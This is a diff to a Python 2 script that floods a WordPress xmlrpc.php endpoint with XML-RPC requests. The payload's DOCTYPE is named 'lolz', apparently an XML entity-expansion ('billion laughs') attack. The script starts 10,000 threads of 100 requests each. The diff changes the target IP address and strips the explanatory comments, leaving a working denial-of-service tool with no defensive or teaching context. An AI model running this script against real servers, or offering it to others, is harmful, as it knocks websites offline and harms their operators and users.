@@ -19,7 +19,7 @@ data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
    <param><value>aa</value></param>
   </params>
 </methodCall>"""
-req = urllib2.Request('http://192.168.1.15/wordpress/xmlrpc.php',data)
+req = urllib2.Request('http://192.168.1.1/wordpress/xmlrpc.php',data)
 req.add_header('Accept', '*/*')
 req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
 req.add_header('Connection', '')
@@ -32,11 +32,11 @@ class MyThread(threading.Thread):
 		for x in range(100):  
 			res = urllib2.urlopen(req)
 		#rdata = res.read()
-		time.sleep(.2)                                      # Pretend to work for a second
-		print("{} finished!".format(self.getName()))             # "Thread-x finished!"
+		time.sleep(.2)                                      
+		print("{} finished!".format(self.getName()))            
 
 if __name__ == '__main__':
-    for x in range(10000):                                     # five times...
-        mythread = MyThread(name = "Thread-{}".format(x + 1))  # ...Instantiate a thread and pass a unique ID to it
-        mythread.start()                                   # ...Start the thread
-        time.sleep(.1)                                     # ...Wait 0.9 seconds before starting another
+    for x in range(10000):                                     
+        mythread = MyThread(name = "Thread-{}".format(x + 1))  
+        mythread.start()                                   
+        time.sleep(.1)                                     
